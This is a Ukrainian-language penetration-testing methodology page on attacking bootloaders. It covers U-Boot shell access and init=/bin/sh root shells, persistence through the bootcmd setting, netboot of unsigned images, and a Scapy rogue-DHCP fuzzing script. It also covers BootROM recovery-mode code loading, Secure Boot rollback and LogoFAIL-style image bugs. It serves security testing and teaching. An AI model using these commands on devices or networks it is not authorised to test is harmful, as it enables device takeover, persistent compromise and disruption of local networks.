# Тестування завантажувача

{{#include ../../banners/hacktricks-training.md}}

Нижче наведено рекомендовані кроки для зміни конфігурацій запуску пристрою та тестування bootloader-ів, таких як U-Boot та UEFI-класні загрузчики. Зосередьтеся на отриманні раннього виконання коду, оцінці підписів/захисту від відкату та зловживанні шляхами відновлення або netboot.

## U-Boot: швидкі результати та зловживання середовищем

1. Отримати доступ до інтерпретаторної оболонки
- Під час завантаження натисніть відомий клавішний брейк (часто будь-яка клавіша, 0, пробіл або плато-специфічна "magic" послідовність) до виконання `bootcmd`, щоб потрапити до промпту U-Boot.

2. Перевірити стан завантаження та змінні середовища
- Корисні команди:
- `printenv` (дамп середовища)
- `bdinfo` (інфо плати, адреси пам'яті)
- `help bootm; help booti; help bootz` (підтримувані методи завантаження ядра)
- `help ext4load; help fatload; help tftpboot` (доступні лоадери)

3. Змінити аргументи завантаження, щоб отримати root shell
- Додайте `init=/bin/sh`, щоб ядро запустило оболонку замість нормального init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot з вашого TFTP-сервера
- Налаштуйте мережу та отримайте kernel/fit образ із LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Зробити зміни постійними через environment
- Якщо збереження env не захищено від запису, можна зберегти контроль:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Перевірте змінні як `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, що впливають на fallback-шляхи. Неправильні значення можуть дозволити повторювано заходити в shell.

6. Перевірити debug/небезпечні можливості
- Шукайте: `bootdelay` > 0, `autoboot` вимкнено, необмежений `usb start; fatload usb 0:1 ...`, можливість `loady`/`loads` через serial, `env import` з ненадійних носіїв, та kernels/ramdisks, що завантажуються без перевірки підписів.

7. Тестування валідації U-Boot образів
- Якщо платформа заявляє secure/verified boot з FIT images, спробуйте unsigned та зміненi образи:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Відсутність `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` або legacy поведінки `verify=n` часто дозволяє завантажувати довільні payload-и.

## Мережевий surface (DHCP/PXE) та зловмисні сервери

8. Фаззинг PXE/DHCP параметрів
- Legacy BOOTP/DHCP обробка в U-Boot мала проблеми безпеки пам'яті. Наприклад, CVE‑2024‑42040 описує розкриття пам'яті через сформовані DHCP-відповіді, що можуть leak байти з пам'яті U-Boot назад по мережі. Пройдіть DHCP/PXE кодові шляхи з надмірно довгими/граничними значеннями (option 67 bootfile-name, vendor options, file/servername поля) та спостерігайте зависання/leak-и.
- Мінімальний Scapy-сніппет для навантаження параметрів boot під час netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Також перевірте, чи поля імен файлів PXE передаються до shell/loader логіки без санітизації, коли вони передаються на OS-side provisioning скрипти.

9. Тестування інжекції команд через зловмисний DHCP сервер
- Запустіть rogue DHCP/PXE сервіс і спробуйте інжектувати символи в поля filename або опції, щоб досягти інтерпретаторів команд на наступних етапах ланцюга завантаження. Metasploit’s DHCP auxiliary, `dnsmasq`, або кастомні Scapy-скрипти підходять добре. Обов’язково ізолюйте лабораторну мережу спочатку.

## Режими відновлення BootROM SoC, що переважають нормальне завантаження

Багато SoC мають BootROM "loader" режим, який приймає код по USB/UART навіть коли flash-образи некоректні. Якщо secure-boot fuse-и не спалені, це може надати довільне виконання коду дуже рано в ланцюжку.

- NXP i.MX (Serial Download Mode)
- Інструменти: `uuu` (mfgtools3) або `imx-usb-loader`.
- Приклад: `imx-usb-loader u-boot.imx` щоб завантажити і запустити кастомний U-Boot з RAM.
- Allwinner (FEL)
- Інструмент: `sunxi-fel`.
- Приклад: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` або `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Інструмент: `rkdeveloptool`.
- Приклад: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` щоб вставити loader і завантажити кастомний U-Boot.

Оцініть, чи пристрій має secure-boot eFuses/OTP спалені. Якщо ні, BootROM download режими часто обходять будь-яку вищерівневу валідацію (U-Boot, kernel, rootfs), виконуючи ваш першочерговий payload прямо з SRAM/DRAM.

## UEFI/PC-клас завантажувачі: швидкі перевірки

10. Підміна ESP та тест відкату
- Замонтуйте EFI System Partition (ESP) і перевірте присутність компонентів завантаження: EFI/Microsoft/Boot/bootmgfw.efi, EFI/BOOT/BOOTX64.efi, EFI/ubuntu/shimx64.efi, grubx64.efi, шляхи vendor logo.
- Спробуйте завантажити понижені або відомі вразливі підписані компоненти завантаження, якщо Secure Boot revocations (dbx) не актуальні. Якщо платформа все ще довіряє старим shim/bootmanagers, часто можна завантажити власне kernel або `grub.cfg` з ESP для отримання персистентності.

11. Баги парсингу boot логотипів (клас LogoFAIL)
- Декілька OEM/IBV firmwares були вразливі до помилок парсингу зображень у DXE, що обробляють boot logos. Якщо атакуючий може помістити crafted image на ESP у vendor-специфічний шлях (наприклад, `\EFI\<vendor>\logo\*.bmp`) і перезавантажити систему, можливе виконання коду під час раннього завантаження навіть з увімкненим Secure Boot. Перевірте, чи платформа приймає user-supplied logos і чи ці шляхи записувані з OS.

## Аппаратна обережність

Будьте обережні при взаємодії з SPI/NAND flash під час раннього завантаження (наприклад, закорочення пінів щоб обійти читання) і завжди консультуйтеся з datasheet флеш-пам'яті. Неправильно синхронізовані шорти можуть пошкодити пристрій або програматор.

## Нотатки та додаткові поради

- Спробуйте `env export -t ${loadaddr}` та `env import -t ${loadaddr}` щоб перемістити blob-и середовища між RAM та сховищем; деякі платформи дозволяють імпорт env з знімних носіїв без автентифікації.
- Для персистентності в Linux-системах, що завантажуються через `extlinux.conf`, зміна рядка `APPEND` (щоб інжектнути `init=/bin/sh` або `rd.break`) на розділі завантаження часто достатня, коли перевірки підписів вимкнені.
- Якщо userland надає `fw_printenv/fw_setenv`, перевірте, що `/etc/fw_env.config` відповідає реальному сховищу env. Неправильні офсети дозволяють читати/писати невірний MTD регіон.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
